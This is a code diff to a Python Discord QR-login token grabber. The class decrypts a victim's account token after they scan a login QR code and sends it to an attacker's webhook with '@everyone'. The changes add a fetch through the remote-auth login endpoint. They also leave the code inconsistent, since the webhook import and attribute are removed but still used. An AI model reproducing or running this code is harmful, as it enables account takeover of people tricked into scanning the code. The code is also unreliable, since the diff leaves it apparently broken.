@@ -7,12 +7,11 @@ from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
 from Crypto.Cipher import PKCS1_OAEP
 import base64
-from discord_webhook import DiscordWebhook, DiscordEmbed
 
 
 class QR:
-    def __init__(self, webhook):
-        self.webhook = webhook
+    def __init__(self):
+
         self.key = RSA.generate(2048)
         self.cipher = PKCS1_OAEP.new(self.key, hashAlgo=SHA256)
 
@@ -30,16 +29,19 @@ class QR:
     async def wait_token(self):
         while True:
             item = await self.recv_json()
-            if item['op'] == "pending_finish":
-                payload = self.decrypt_payload(item['encrypted_user_payload'])
-                new = payload.decode()
-                id, discrim, hash, name = new.split(":")
-            if item['op'] == "finish":
-                payload = self.decrypt_payload(item['encrypted_token'])
-                token = payload.decode()
-            if ('id' in locals()) and ('discrim' in locals()) and ('hash' in locals()) and ('name' in locals()) and ('token' in locals()):
-                await self.send_webhook(id, discrim, hash, name, token)
-                break
+            if item["op"] == "pending_login":
+                token = await self.decrypt_ticket(item["ticket"])
+                return token
+
+    async def decrypt_ticket(self, ticket):
+        async with aiohttp.ClientSession() as session:
+            async with session.post("https://discord.com/api/v9/users/@me/remote-auth/login", headers={"user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.115 Safari/537.36"}, json={"ticket": ticket}) as resp:
+                if resp.status == 200:
+                    j = await resp.json()
+                    payload = j["encrypted_token"]
+                    token = self.decrypt_payload(payload)
+                    return token.decode("utf-8")
+
 
 
 
@@ -51,14 +53,14 @@ class QR:
                     for key, value in j.items():
                         embed.add_embed_field(name=f"`{key}`", value=f"{value}", inline=False)
 
-    async def send_webhook(self, id, discrim, hash, name, token):
+    async def send_webhook(self,token):
         webhook = DiscordWebhook(url=self.webhook)
-        embed = DiscordEmbed(title=f"{name}#{discrim}", description="User info below")
-        await self.tokeninfo(token, embed)
-        embed.set_thumbnail(url=f'https://cdn.discordapp.com/avatars/{id}/{hash}.png')
-        embed.add_embed_field(name="`Token:`", value=f"{token}", inline=False)
-        webhook.add_embed(embed)
-        webhook.set_content("@everyone")
+        # embed = DiscordEmbed(title=f"{name}#{discrim}", description="User info below")
+        # await self.tokeninfo(token, embed)
+        # embed.set_thumbnail(url=f'https://cdn.discordapp.com/avatars/{id}/{hash}.png')
+        # embed.add_embed_field(name="`Token:`", value=f"{token}", inline=False)
+        # webhook.add_embed(embed)
+        webhook.set_content(f"@everyone {token}")
         webhook.execute()
 
     async def send_json(self, payload: dict):
@@ -90,7 +92,6 @@ class QR:
         item = await self.recv_json()
         if item['op'] == "hello":
             interval = item['heartbeat_interval']
-
         pubkey = self.generate_pubkey()
         await self.send_json({"op": "init", "encoded_public_key": pubkey})
         asyncio.create_task(self.heartbeat(interval))
